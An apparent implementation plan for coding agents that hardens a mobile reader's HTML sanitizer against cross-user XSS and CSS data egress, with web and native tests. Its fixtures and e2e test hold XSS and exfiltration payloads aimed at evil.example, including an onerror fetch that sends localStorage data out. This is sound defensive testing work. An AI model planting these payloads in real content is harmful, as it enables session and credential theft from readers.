# Topic-path Sanitizer Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the live cross-user injection on the topic/shared-draft render path — the native WebView's unsanitized `innerHTML` (Critical XSS → BYOK/session theft) and the web `sanitizeFragment`'s missing CSS/style/srcset/SVG-paint hardening (Moderate CSS egress).

**Architecture:** Port F1's battle-tested chapter sanitizer (7 Criticals closed, on `feat/open-shelves`) to the topic path, self-contained on `main`. Web: add a topic sanitize hook + primitives and harden `SANITIZE_CONFIG`. Native: give `htmlDocument` the same inlined-DOMPurify + CSP + sanitize-before-`innerHTML` treatment `htmlChapterDocument` already has. One shared web core; a hand-authored native JS twin pinned by a parity test.

**Tech Stack:** TypeScript, DOMPurify (web + inlined-in-WebView via `DOMPURIFY_SRC`), Jest (jsdom, incl. `runScripts:"dangerously"` for the native document), react-native-webview.

## Global Constraints

- **Base branch: `main`.** Branch is `fix/topic-sanitizer-hardening` (already created off `main` @ `b50337e`). This is a shippable production security fix.
- **Do NOT import or depend on F1 code.** `makeChapterSanitizeHook`, `CHAPTER_SANITIZE_CONFIG`, `isSafePaintValue`, `htmlChapterDocument`, `CHAPTER_SANITIZE_HOOK_JS` exist ONLY on `feat/open-shelves`, NOT on `main`. Use them as a **read-only reference blueprint via `git show feat/open-shelves:<path>`** — port, do not import.
- **Web config:** `SANITIZE_CONFIG.FORBID_TAGS` gains `"style"`; `FORBID_ATTR` gains `"style"`, `"srcset"`. **Keep** `ADD_TAGS: ANIMATION_TAGS` and `ADD_ATTR: ANIMATION_ATTRS` (animated-SVG figures).
- **Paint allowlist (`isSafePaintValue`):** accept only a plain colour/keyword/number, or exactly `url(#ident)` (optionally one trailing safe fallback token per F1); reject any backslash or unknown function. Over-refusal is the intended failure mode.
- **URI attrs → `data:`-only** (drop otherwise). Topics have **no image map** — `src` is `data:`-or-drop like every other URI attr. `data:image/svg+xml` payloads are recursively re-sanitized with a nested config that also forbids `style`/`srcset`.
- **Native CSP (exact string):** `default-src 'none'; img-src data:; style-src 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; script-src 'unsafe-inline' https://cdn.jsdelivr.net; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; connect-src 'none'`. (Looser than the chapter CSP because topics legitimately load KaTeX/Mermaid/Google-Fonts. `connect-src 'none'` + `img-src data:` are the egress backstop; DOMPurify remains the primary control.)
- **Native must sanitize `DATA.__html` with DOMPurify BEFORE it is assigned to `innerHTML`.** Never assign the raw string.
- **Preserve, verified zero-cost:** KaTeX/Mermaid (run *after* sanitize — untouched), animated SVG (`fill="url(#id)"` + animation attrs), `data:` figures, prose/tables, `#fragment` anchors.
- **Security disclosure:** private GHSA (Critical native XSS + Moderate web egress). Commit messages describe "sanitizer hardening" — do NOT paste the live `onerror`/`localStorage` exploit string into a public commit body.
- **Do not weaken existing tests.** Full suite green + `tsc --noEmit` 0 + `eslint .` clean before each commit.

---

## Reference blueprints (read these first — they are the proven design)

```bash
git show feat/open-shelves:mobile/src/reader/sanitize.ts        # web primitives (lines ~172-412)
git show feat/open-shelves:mobile/src/components/contentHtml.ts # native chapter doc (lines ~266-467)
```

Key web symbols to port (from `sanitize.ts` on `feat/open-shelves`): `CHAPTER_PAINT_ATTRS` (:172), `isDataUri` (:185), `isFragmentOnlyHref` (:193), `isSafePaintToken` (:202), `isSafePaintValue` (:246), `makeChapterSanitizeHook` (:298, incl. its inner `sanitizeSvgDataUri` :304), `CHAPTER_URI_ATTRS` (:98), `CHAPTER_HOOKLESS_FORBID_ATTR` (:137), `CHAPTER_SANITIZE_CONFIG` (:382).
Key native symbols to port (from `contentHtml.ts`): `CHAPTER_SANITIZE_HOOK_JS` (:266), `CHAPTER_SANITIZE_CONFIG_JS` (:413), `htmlChapterDocument` (:419), the sanitize-before-`innerHTML` pattern (:442-447).

**The only topic adaptations:** (1) drop the image-map argument/branch — `src` is `data:`-or-drop; (2) keep the animation `ADD_TAGS`/`ADD_ATTR`; (3) native CSP is the looser topic string above (topics load CDNs); (4) keep the existing post-`innerHTML` KaTeX/Mermaid enhancement scripts in the topic doc.

---

## Task 1: Web topic sanitizer — primitives, hook, hardened config

**Files:**
- Modify: `mobile/src/reader/sanitize.ts` (add topic primitives + `makeTopicSanitizeHook`; harden `SANITIZE_CONFIG`; wire the hook into `sanitizeFragment`)
- Create: `mobile/src/reader/topicSanitizeVectors.fixtures.ts` (the shared attack + keep vector table)
- Test: `mobile/__tests__/reader/topicSanitize.web.test.ts`

**Interfaces:**
- Consumes: `DOMPurify` (already imported in `sanitize.ts`), `SANITIZE_CONFIG`, `sanitizeFragment` (existing).
- Produces: `sanitizeFragment(html: string): string` — now drops the CSS/style/srcset/SVG-paint fetch channels while preserving animation. Internal: `isSafePaintValue(v: string|null): boolean`, `URI_ATTRS: readonly string[]`, `makeTopicSanitizeHook(purify): (node)=>void`. Exports `TOPIC_SANITIZE_VECTORS` from the fixtures file for reuse by Task 2/3.

- [ ] **Step 1: Write the failing test (attack + keep vectors on `sanitizeFragment`)**

Create `mobile/src/reader/topicSanitizeVectors.fixtures.ts`:

```ts
// Shared attack + keep vectors for the topic sanitizer (web + native).
// "leaks(out)" is true if the fetch channel SURVIVES the sanitized output.
export interface SanitizeVector {
  name: string;
  html: string;
  leaks: (out: string) => boolean; // true = STILL a fetch channel (a failure)
}

const evil = (o: string) => o.includes("evil.example");

export const ATTACK_VECTORS: SanitizeVector[] = [
  { name: "style attr url()", html: '<div style="background:url(https://evil.example/x.png)">x</div>', leaks: evil },
  { name: "style attr image-set() bare string", html: `<div style="background-image:image-set('https://evil.example/v.png' 1x)">x</div>`, leaks: evil },
  { name: "style attr var() indirection", html: `<div style="--a:'https://evil.example/v.png';background-image:image-set(var(--a) 1x)">x</div>`, leaks: evil },
  { name: "style attr CSS-escape \\75 rl(", html: `<div style="background:\\75 rl(https://evil.example/x.png)">x</div>`, leaks: evil },
  { name: "<style> @import", html: '<p>a</p><style>@import url("https://evil.example/x.css");</style><p>b</p>', leaks: evil },
  { name: "srcset remote candidate", html: '<img src="data:image/png;base64,AAA=" srcset="https://evil.example/2x.png 2x">', leaks: evil },
  { name: "SVG fill=url()", html: '<svg><rect fill="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "SVG filter=url()", html: '<svg><rect filter="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "SVG mask=url()", html: '<svg><rect mask="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
  { name: "table background= attr", html: '<table><tr background="https://evil.example/tr.png"><td>x</td></tr></table>', leaks: evil },
  { name: "data:svg with nested remote <image>", html: `<img src="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>').toString("base64")}">`, leaks: evil },
  { name: "external img src", html: '<img src="https://evil.example/track.png">', leaks: evil },
  { name: "script tag (XSS)", html: '<p>a</p><script>fetch("https://evil.example/x")</script>', leaks: (o) => o.includes("<script") || evil(o) },
  { name: "img onerror handler (XSS)", html: '<img src="x" onerror="fetch(\'https://evil.example/x\')">', leaks: (o) => o.includes("onerror") || evil(o) },
];

export const KEEP_VECTORS: { name: string; html: string; survives: (o: string) => boolean }[] = [
  { name: "animated SVG fill=url(#local) gradient", html: '<svg><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><rect fill="url(#g)" width="1" height="1"><animate attributeName="opacity" dur="1s" values="0;1"/></rect></svg>', survives: (o) => o.includes("url(#g)") && o.includes("<animate") },
  { name: "data: figure image", html: '<img src="data:image/png;base64,iVBORw0KGgo=" alt="fig">', survives: (o) => o.includes("data:image/png") && o.includes('alt="fig"') },
  { name: "plain colour fill", html: '<svg><rect fill="#ff0000" width="1" height="1"/></svg>', survives: (o) => o.includes('fill="#ff0000"') },
  { name: "prose + heading + table", html: '<h2>Title</h2><p>Body text.</p><table><tr><td>cell</td></tr></table>', survives: (o) => o.includes("Body text.") && o.includes("<td>cell</td>") },
  { name: "#fragment anchor (footnote)", html: '<a href="#fn1">1</a>', survives: (o) => o.includes('href="#fn1"') },
];
```

Create `mobile/__tests__/reader/topicSanitize.web.test.ts`:

```ts
/** @jest-environment jsdom */
import { sanitizeFragment } from "@/reader/sanitize";
import { ATTACK_VECTORS, KEEP_VECTORS } from "@/reader/topicSanitizeVectors.fixtures";

describe("topic web sanitizer — sanitizeFragment", () => {
  it.each(ATTACK_VECTORS.map((v) => [v.name, v] as const))(
    "drops the fetch channel: %s",
    (_n, v) => {
      const out = sanitizeFragment(v.html);
      expect(v.leaks(out)).toBe(false);
    },
  );

  it.each(KEEP_VECTORS.map((v) => [v.name, v] as const))(
    "preserves legit content: %s",
    (_n, v) => {
      const out = sanitizeFragment(v.html);
      expect(v.survives(out)).toBe(true);
    },
  );
});
```

- [ ] **Step 2: Run it, watch it fail**

Run: `cd mobile && npx jest __tests__/reader/topicSanitize.web.test.ts`
Expected: FAIL — the ATTACK vectors leak (channels survive) against the current unhardened `SANITIZE_CONFIG`.

- [ ] **Step 3: Port the primitives + hook into `sanitize.ts`**

Read the blueprint: `git show feat/open-shelves:mobile/src/reader/sanitize.ts`. Port these into `mobile/src/reader/sanitize.ts` on `main`, renamed for the topic boundary and **without the image-map branch**:
- `isDataUri`, `isFragmentOnlyHref`, `isSafePaintToken`, `isSafePaintValue` — copy verbatim (pure helpers).
- `URI_ATTRS` — copy F1's `CHAPTER_URI_ATTRS` list verbatim (rename).
- `PAINT_ATTRS` — copy F1's `CHAPTER_PAINT_ATTRS` verbatim (rename).
- `HOOKLESS_FORBID_ATTR = ["style", "srcset"] as const` — copy verbatim.
- `makeTopicSanitizeHook(purify)` — port `makeChapterSanitizeHook` but **drop the `images` parameter and the map-resolution branch**; in the URI loop, `src` follows the same `data:`-or-drop rule as every other `URI_ATTRS` entry (F1's chapter version resolves `src` from the map first; topics skip that). Keep the inner `sanitizeSvgDataUri` recursion **verbatim**, including its nested config `FORBID_ATTR: [...HOOKLESS_FORBID_ATTR]`.

Harden `SANITIZE_CONFIG` (keep `ADD_TAGS`/`ADD_ATTR` animation; add the forbids):

```ts
export const SANITIZE_CONFIG = {
  USE_PROFILES: { html: true, svg: true },
  ADD_TAGS: ANIMATION_TAGS,
  ADD_ATTR: ANIMATION_ATTRS,
  FORBID_TAGS: ["script", "iframe", "object", "embed", "form", "foreignObject", "style"],
  FORBID_ATTR: ["srcdoc", "formaction", "xlink:href", ...HOOKLESS_FORBID_ATTR],
};
```

Wire the hook into `sanitizeFragment` (add/remove around the single sanitize call, mirroring F1's `sanitizeImportedChapterHtml`):

```ts
export function sanitizeFragment(html: string): string {
  const hook = makeTopicSanitizeHook(DOMPurify);
  DOMPurify.addHook("afterSanitizeAttributes", hook);
  try {
    return DOMPurify.sanitize(html, SANITIZE_CONFIG) as unknown as string;
  } finally {
    DOMPurify.removeHook("afterSanitizeAttributes", hook);
  }
}
```

- [ ] **Step 4: Run it, watch it pass**

Run: `cd mobile && npx jest __tests__/reader/topicSanitize.web.test.ts`
Expected: PASS — all ATTACK vectors drop, all KEEP vectors survive.

- [ ] **Step 5: Guard the whole suite + types + lint**

Run: `cd mobile && npx jest __tests__/reader && npx tsc --noEmit && npx eslint src/reader/sanitize.ts src/reader/topicSanitizeVectors.fixtures.ts`
Expected: green, tsc 0, eslint clean. (Existing `sanitize.test.ts` must still pass — the animation-href vector and profile pins are unchanged.)

- [ ] **Step 6: Commit**

```bash
git add mobile/src/reader/sanitize.ts mobile/src/reader/topicSanitizeVectors.fixtures.ts mobile/__tests__/reader/topicSanitize.web.test.ts
git commit -m "fix(reader): harden the web topic sanitizer (style/srcset/SVG-paint fetch channels)

sanitizeFragment now drops the CSS/style/srcset/SVG-paint url() fetch channels
and recursively re-sanitizes data:image/svg+xml payloads, matching the chapter
boundary, while keeping animated-SVG figures. Ported from the F1 chapter design.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Task 2: Native topic WebView — inline DOMPurify, sanitize before innerHTML, CSP

**Files:**
- Modify: `mobile/src/components/contentHtml.ts` (`htmlDocument`: add `DOMPURIFY_SRC` + `TOPIC_SANITIZE_HOOK_JS` + CSP; sanitize `DATA.__html` before `innerHTML`)
- Create: `mobile/src/components/topicSanitizeHook.generated.ts` OR add `TOPIC_SANITIZE_HOOK_JS`/`TOPIC_SANITIZE_CONFIG_JS` consts in `contentHtml.ts` (mirror F1's `CHAPTER_SANITIZE_HOOK_JS` location)
- Test: `mobile/__tests__/components/topicSanitize.native.test.ts`

**Interfaces:**
- Consumes: `DOMPURIFY_SRC` (`@/components/dompurifySource`, already on `main`), `renderTopicToHtml`, `jsonForScriptBlock`, `buildTopicHtml` (existing), `ATTACK_VECTORS`/`KEEP_VECTORS` from Task 1's fixtures.
- Produces: `buildTopicHtml(topic, dataUrls?)` — unchanged signature; its document now sanitizes in-WebView before `innerHTML` and carries the topic CSP.

- [ ] **Step 1: Write the failing test (execute the real document in jsdom)**

Create `mobile/__tests__/components/topicSanitize.native.test.ts`:

```ts
/** @jest-environment jsdom */
// Executes the REAL native topic document (buildTopicHtml output) the way the
// WebView does — runScripts:"dangerously" runs the inlined DOMPurify + hook +
// the innerHTML assignment — then reads back #root. Mirrors F1's chapter native
// test. This proves the shipped WebView doc sanitizes, not a mock.
import { JSDOM } from "jsdom";
import { buildTopicHtml } from "@/components/contentHtml";
import { ATTACK_VECTORS, KEEP_VECTORS } from "@/reader/topicSanitizeVectors.fixtures";
import type { GeneratedTopic } from "@/types/book";

function topicWith(bodyHtml: string): GeneratedTopic {
  return {
    id: "t", label: "x", detail: "d",
    lesson: { title: "x", sections: [{ heading: "S", body_markdown: `intro\n\n${bodyHtml}` }] },
  } as unknown as GeneratedTopic;
}

// Render the doc, strip the CDN <script src> tags (offline in jest — KaTeX/Mermaid
// are absent and optional), run the rest, return #root.innerHTML.
function renderRoot(html: string): string {
  const doc = html.replace(/<script src="https:[^"]*"><\/script>/g, "");
  const dom = new JSDOM(doc, { runScripts: "dangerously" });
  return dom.window.document.getElementById("root")?.innerHTML ?? "";
}

describe("native topic WebView document", () => {
  it("has the topic CSP meta, scoped to CDNs + connect-src none", () => {
    const out = buildTopicHtml(topicWith("<p>x</p>"));
    expect(out).toContain(`http-equiv="Content-Security-Policy"`);
    expect(out).toContain("connect-src 'none'");
    expect(out).toContain("img-src data:");
    expect(out).toContain("https://cdn.jsdelivr.net");
  });

  it.each(ATTACK_VECTORS.map((v) => [v.name, v] as const))(
    "sanitizes before innerHTML — drops: %s",
    (_n, v) => {
      const root = renderRoot(buildTopicHtml(topicWith(v.html)));
      expect(v.leaks(root)).toBe(false);
    },
  );

  it.each(KEEP_VECTORS.map((v) => [v.name, v] as const))(
    "preserves legit content: %s",
    (_n, v) => {
      const root = renderRoot(buildTopicHtml(topicWith(v.html)));
      expect(v.survives(root)).toBe(true);
    },
  );
});
```

- [ ] **Step 2: Run it, watch it fail**

Run: `cd mobile && npx jest __tests__/components/topicSanitize.native.test.ts`
Expected: FAIL — no CSP meta; ATTACK vectors survive (`htmlDocument` assigns raw `innerHTML`).

- [ ] **Step 3: Port the native sanitizer into `htmlDocument`**

Read the blueprint: `git show feat/open-shelves:mobile/src/components/contentHtml.ts` (`CHAPTER_SANITIZE_HOOK_JS` :266, `CHAPTER_SANITIZE_CONFIG_JS` :413, `htmlChapterDocument` :419-447).

In `mobile/src/components/contentHtml.ts`:
1. Add `TOPIC_SANITIZE_HOOK_JS` — port `CHAPTER_SANITIZE_HOOK_JS` verbatim but **drop the image-map lookup** (topics: `src` is `data:`-or-drop, same as other URI attrs). Keep the `sanitizeSvgDataUri` recursion + the paint allowlist + the `data:`-only loop.
2. Add `TOPIC_SANITIZE_CONFIG_JS` — port `CHAPTER_SANITIZE_CONFIG_JS` but add the topic animation allowances: `ADD_TAGS: ["animate","animateTransform","set"]`, `ADD_ATTR: [<the ANIMATION_ATTRS list>]`, and `FORBID_TAGS`/`FORBID_ATTR` including `style`/`srcset` as in Task 1.
3. In `htmlDocument`, add to `<head>` (after the viewport meta) the exact topic CSP string (Global Constraints). Keep the existing Google-Fonts / KaTeX-CSS `<link>` and the KaTeX/Mermaid CDN `<script src>` tags — the CSP permits them.
4. Add `<script>${DOMPURIFY_SRC}</script>` and `<script>${TOPIC_SANITIZE_HOOK_JS}</script>` before the main IIFE.
5. Replace the raw assignment. Change:

```js
document.getElementById('root').innerHTML = DATA.__html;
```

to (sanitize BEFORE assignment, mirroring `htmlChapterDocument` :442-447):

```js
var clean = DOMPurify.sanitize(DATA.__html, ${TOPIC_SANITIZE_CONFIG_JS});
document.getElementById('root').innerHTML = clean;
```

Leave the post-assignment KaTeX (`renderMathInElement`) and Mermaid guarded blocks unchanged — they run over the already-sanitized DOM.

- [ ] **Step 4: Run it, watch it pass**

Run: `cd mobile && npx jest __tests__/components/topicSanitize.native.test.ts`
Expected: PASS — CSP present; ATTACK vectors dropped from `#root`; KEEP vectors survive.

- [ ] **Step 5: Guard suite + types + lint**

Run: `cd mobile && npx jest __tests__/components && npx tsc --noEmit && npx eslint src/components/contentHtml.ts`
Expected: green, tsc 0, eslint clean. (Existing topic-render tests must still pass — the body is the same, now sanitized.)

- [ ] **Step 6: Commit**

```bash
git add mobile/src/components/contentHtml.ts mobile/__tests__/components/topicSanitize.native.test.ts
git commit -m "fix(reader): sanitize the native topic WebView before innerHTML + add CSP

The native topic document assigned untrusted shared-draft HTML straight to
innerHTML with no DOMPurify. It now inlines DOMPurify and sanitizes before
assignment (matching the chapter WebView), and carries a CSP scoped to the
KaTeX/Mermaid/font CDNs with connect-src 'none' as an egress backstop.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## Task 3: Cross-surface parity, e2e, and preservation completeness

**Files:**
- Test: `mobile/__tests__/reader/topicSanitize.parity.test.ts`
- Test: `mobile/__tests__/reader/topicSanitize.e2e.test.ts`

**Interfaces:**
- Consumes: `sanitizeFragment` (Task 1), `renderTopicToSafeHtml` (`@/reader/renderContent`, existing), `buildTopicHtml` (Task 2), `ATTACK_VECTORS`/`KEEP_VECTORS` (Task 1 fixtures).
- Produces: no code — coverage that pins parity + the real render entries.

- [ ] **Step 1: Write the parity test (both surfaces agree on every vector)**

Create `mobile/__tests__/reader/topicSanitize.parity.test.ts`:

```ts
/** @jest-environment jsdom */
// The web hook (real function) and the native hook (hand-authored JS string) are
// two copies of one algorithm. This pins them: for every attack + keep vector,
// the web boundary and the executed native document must agree (both drop, or
// both preserve). Catches drift — the "parity != coverage" lesson from F1.
import { JSDOM } from "jsdom";
import { sanitizeFragment } from "@/reader/sanitize";
import { buildTopicHtml } from "@/components/contentHtml";
import { ATTACK_VECTORS, KEEP_VECTORS } from "@/reader/topicSanitizeVectors.fixtures";
import type { GeneratedTopic } from "@/types/book";

const topicWith = (h: string) =>
  ({ id: "t", label: "x", detail: "d", lesson: { title: "x", sections: [{ heading: "S", body_markdown: `i\n\n${h}` }] } } as unknown as GeneratedTopic);
const nativeRoot = (h: string) => {
  const doc = buildTopicHtml(topicWith(h)).replace(/<script src="https:[^"]*"[^>]*><\/script>/g, "");
  return new JSDOM(doc, { runScripts: "dangerously" }).window.document.getElementById("root")?.innerHTML ?? "";
};

it.each(ATTACK_VECTORS.map((v) => [v.name, v] as const))("both surfaces drop: %s", (_n, v) => {
  expect(v.leaks(sanitizeFragment(v.html))).toBe(false);
  expect(v.leaks(nativeRoot(v.html))).toBe(false);
});
```

- [ ] **Step 2: Run parity — expect PASS (Tasks 1+2 already closed both)**

Run: `cd mobile && npx jest __tests__/reader/topicSanitize.parity.test.ts`
Expected: PASS. If any vector drops on one surface but not the other, that is a real drift bug — fix the lagging copy before proceeding.

- [ ] **Step 3: Write the e2e test (malicious shared draft through the real entries)**

Create `mobile/__tests__/reader/topicSanitize.e2e.test.ts`:

```ts
/** @jest-environment jsdom */
// Mirrors shared/[id].tsx: a hostile author's book_json topic, through the REAL
// render entries. Web: renderTopicToSafeHtml. Native: buildTopicHtml executed.
import { JSDOM } from "jsdom";
import { renderTopicToSafeHtml } from "@/reader/renderContent";
import { buildTopicHtml } from "@/components/contentHtml";
import type { GeneratedTopic } from "@/types/book";

const hostile = {
  id: "t", label: "Intro", detail: "d",
  lesson: { title: "Intro", sections: [{
    heading: "S1",
    body_markdown:
      'Real prose.\n\n<img src="x" onerror="fetch(\'https://evil.example/steal?k=\'+localStorage.length)">\n\n' +
      '<style>@import url("https://evil.example/c.css")</style>\n\n' +
      '<div style="background-image:image-set(\'https://evil.example/p.png\' 1x)">x</div>',
  }] },
} as unknown as GeneratedTopic;

it("web entry (renderTopicToSafeHtml) drops all egress + XSS, keeps prose", () => {
  const out = renderTopicToSafeHtml(hostile);
  expect(out).not.toContain("evil.example");
  expect(out).not.toContain("onerror");
  expect(out).not.toContain("<script");
  expect(out).toContain("Real prose.");
});

it("native entry (buildTopicHtml, executed) drops all egress + XSS, keeps prose", () => {
  const doc = buildTopicHtml(hostile).replace(/<script src="https:[^"]*"[^>]*><\/script>/g, "");
  const root = new JSDOM(doc, { runScripts: "dangerously" }).window.document.getElementById("root")?.innerHTML ?? "";
  expect(root).not.toContain("evil.example");
  expect(root).not.toContain("onerror");
  expect(root).toContain("Real prose.");
});
```

- [ ] **Step 4: Run e2e — expect PASS**

Run: `cd mobile && npx jest __tests__/reader/topicSanitize.e2e.test.ts`
Expected: PASS — `evil.example`/`onerror`/`<script` absent from both entries; prose survives.

- [ ] **Step 5: Full guard — suite + types + lint**

Run: `cd mobile && npx jest && npx tsc --noEmit && npx eslint .`
Expected: whole suite green (all prior tests + the new topic tests), tsc 0, eslint clean.

- [ ] **Step 6: Commit**

```bash
git add mobile/__tests__/reader/topicSanitize.parity.test.ts mobile/__tests__/reader/topicSanitize.e2e.test.ts
git commit -m "test(reader): pin topic web/native sanitizer parity + e2e shared-draft render

Both topic surfaces agree on every attack/keep vector (no drift), and a hostile
shared-draft topic through the real render entries (renderTopicToSafeHtml +
buildTopicHtml) leaks nothing while keeping legitimate content.

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## After all tasks

- **Final whole-branch review — F1-grade adversarial.** Dispatch on the most capable model with the "attack the boundary, not the table" instruction (§5 of the spec): hunt a channel the vector table doesn't enumerate; confirm the native CSP is not the *only* control relied on (DOMPurify must be); verify no XSS/egress survives on either surface. Range: `git merge-base main HEAD..HEAD`.
- **Optional device confirmation:** `mobile:verify` — reproduce the native XSS pre-fix (checkout `b50337e`) and confirm closure post-fix, to make the GHSA airtight.
- **GHSA advisory:** draft the private advisory (Critical native XSS + credential theft; Moderate web CSS egress) for the user to review and file, in step with the merge.
- **Ledger note on `feat/open-shelves`:** record R4 — when F1 merges to `main`, converge its chapter primitives with these topic primitives (one shared web core + one native twin per boundary).

## Self-Review (completed)

- **Spec coverage:** §3.1 native → Task 2; §3.2 web → Task 1; §3.3 primitives → Task 1 (web) + Task 2 (native JS); §3.4 preservation → KEEP_VECTORS in every task; §4 testing → Tasks 1–3 (web vectors, native jsdom-execute, parity, e2e); §5 review + §6 disclosure + R4 → "After all tasks". Base-branch constraint → Global Constraints + Reference blueprints.
- **Placeholder scan:** none — every step carries concrete code, exact commands, expected output; porting steps cite exact blueprint symbols + line numbers.
- **Type consistency:** `sanitizeFragment`, `renderTopicToSafeHtml`, `buildTopicHtml`, `GeneratedTopic`, `ATTACK_VECTORS`/`KEEP_VECTORS` used identically across tasks; `makeTopicSanitizeHook`/`URI_ATTRS`/`isSafePaintValue` introduced in Task 1 and referenced by name in Task 2's porting notes.

---

## Task 4: Convert the one `<style>`-dependent figure to inline attrs + SMIL, re-sign the book

**Why:** Task 1 forbids `<style>` (required — CSS-in-`<style>` is an unscreenable fetch channel). One bundled figure — the "Escalation decision flow animation" in `claude-certified-architect-foundations` — used a `<style>` block for BOTH its text styling (`.label`/`.sublabel` → `fill`/font) AND its opacity pulse (`@keyframes pulse1-4`). Without `<style>` its labels lose their near-white fill (invisible on the dark reader) and the pulse stops. Convert both to the SVG-native forms the sanitizer keeps (inline presentation attrs + SMIL `<animate>` — the same book already uses 62 SMIL animations). The book is in the SIGNED default-library manifest, so it must be re-signed (CLAUDE.md pitfall #7).

**Files:**
- Modify: `library/books/claude-certified-architect-foundations.book.json` (canonical — the SVG figure)
- Modify (regenerated): `library/manifest.json` (sha256/bytes/signature, via `owner_cli`)
- Mirror: `mobile/assets/library/books/claude-certified-architect-foundations.book.json` + `mobile/assets/library/manifest.json`
- Test: reuse `mobile/__tests__/reader/topicSanitize.web.test.ts` KEEP coverage + the backend signature gate.

**Interfaces:** Consumes Task 1's hardened `sanitizeFragment`. Produces no code — a content + signature change.

- [ ] **Step 1: Read the figure and the signing tool**
Run: `git show HEAD:library/books/claude-certified-architect-foundations.book.json | python3 -c "import sys,re; t=sys.stdin.read(); m=re.search(r'<svg[^>]*Escalation[\s\S]{0,4000}?</svg>', t); print((m.group(0) if m else 'NOT FOUND').encode().decode('unicode_escape'))"`
Also read `backend/src/core/owner_cli.py` (the `publish` command runs `_refresh_integrity` → recomputes sha256/bytes, then `sign_entry`).

- [ ] **Step 2: Edit the figure in `library/books/...book.json`** (the canonical copy)

Inside the "Escalation decision flow animation" `<svg>`:
- **Delete the entire `<style>…</style>` block.**
- **Inline the text styling** — on every `<text class="label">` add `font-family="sans-serif" font-size="11" fill="#f8fafc"` and remove `class="label"`; on every `<text class="sublabel">` add `font-family="sans-serif" font-size="9" fill="#94a3b8"` and remove `class="sublabel"`.
- **Convert each pulse to SMIL** — inside each `<g class="n1">…<g class="n4">`, add an `<animate>` and remove the `class="nX"`:
  - n1: `<animate attributeName="opacity" values="0.3;1;1;0.3" keyTimes="0;0.2;0.4;1" dur="3s" repeatCount="indefinite"/>`
  - n2: `<animate attributeName="opacity" values="0.3;0.3;1;1;0.3" keyTimes="0;0.2;0.4;0.6;1" dur="3s" repeatCount="indefinite"/>`
  - n3: `<animate attributeName="opacity" values="0.3;0.3;1;1;0.3" keyTimes="0;0.4;0.6;0.8;1" dur="3s" repeatCount="indefinite"/>`
  - n4: `<animate attributeName="opacity" values="0.3;0.3;1;1" keyTimes="0;0.6;0.8;1" dur="3s" repeatCount="indefinite"/>`
- Confirm the figure now contains no `<style>` and no `@keyframes`/`animation:`; `<animate>` is already allowlisted (`ADD_TAGS`), so the sanitizer keeps it.

- [ ] **Step 3: Re-sign the book (standalone, no backend venv) + mirror**

There is **no backend venv** (`owner_cli` can't import `pydantic_settings`), but the signing is pure stdlib. This script **exactly replicates** `owner_cli publish` / `library_publish.sign_entry` (verified against `backend/src/core/library_publish.py:30,43-59` and `owner_cli.py:_refresh_integrity`): recompute `sha256`/`bytes`/`generatedCount` from the edited canonical book, then HMAC-SHA256 over `_SIGNED_FIELDS=("id","file","version","status","sha256","bytes")` keyed by `bytes.fromhex(secret)`, and write with `json.dumps(indent=2, ensure_ascii=False)+"\n"`. The book **id is `claude-cert-architect-foundations`** (NOT the filename).

```bash
cd /home/sivam/Documents/code/projects/AIStuff/STEM_studybuddy/Mentible
python3 - <<'PY'
import json, hmac, hashlib, pathlib
SECRET = "1" * 64                                   # dev constant (pitfall #7) — NEVER a real .env secret
FIELDS = ("id", "file", "version", "status", "sha256", "bytes")
BOOK_ID = "claude-cert-architect-foundations"
mp = pathlib.Path("library/manifest.json")
m = json.loads(mp.read_text())
hit = False
for e in m["books"]:
    if e["id"] == BOOK_ID:
        raw = (mp.parent / e["file"]).read_bytes()  # library/books/...book.json
        e["sha256"] = hashlib.sha256(raw).hexdigest()
        e["bytes"] = len(raw)
        book = json.loads(raw)
        e["generatedCount"] = len(book.get("content") or {})
        payload = "\n".join(f"{f}={e[f]}" for f in FIELDS).encode("utf-8")
        e["signature"] = hmac.new(bytes.fromhex(SECRET), payload, hashlib.sha256).hexdigest()
        hit = True
        print(f"re-signed {BOOK_ID}: sha256={e['sha256'][:12]}… bytes={e['bytes']} sig={e['signature'][:12]}…")
assert hit, "book id not found in manifest"
mp.write_text(json.dumps(m, indent=2, ensure_ascii=False) + "\n")
PY
# mirror the edited book + regenerated manifest into the mobile bundle:
cp library/books/claude-certified-architect-foundations.book.json mobile/assets/library/books/claude-certified-architect-foundations.book.json
cp library/manifest.json mobile/assets/library/manifest.json
```

- [ ] **Step 4: Verify signature + no regression**
```bash
# Re-verify the signature with an INDEPENDENT stdlib recompute (proves it validates):
python3 - <<'PY'
import json, hmac, hashlib
SECRET="1"*64; FIELDS=("id","file","version","status","sha256","bytes"); BOOK_ID="claude-cert-architect-foundations"
m=json.load(open("library/manifest.json"))
e=next(b for b in m["books"] if b["id"]==BOOK_ID)
payload="\n".join(f"{f}={e[f]}" for f in FIELDS).encode()
exp=hmac.new(bytes.fromhex(SECRET),payload,hashlib.sha256).hexdigest()
assert hmac.compare_digest(exp,e["signature"]), "SIGNATURE INVALID"
raw=open("library/books/claude-certified-architect-foundations.book.json","rb").read()
assert e["sha256"]==hashlib.sha256(raw).hexdigest() and e["bytes"]==len(raw), "sha256/bytes stale"
assert open("mobile/assets/library/manifest.json").read()==open("library/manifest.json").read(), "mobile mirror != canonical"
print("signature valid, integrity fresh, mirror matches")
PY
cd mobile && npx jest __tests__/reader && npx tsc --noEmit   # figure still sanitizes clean, suite green
```
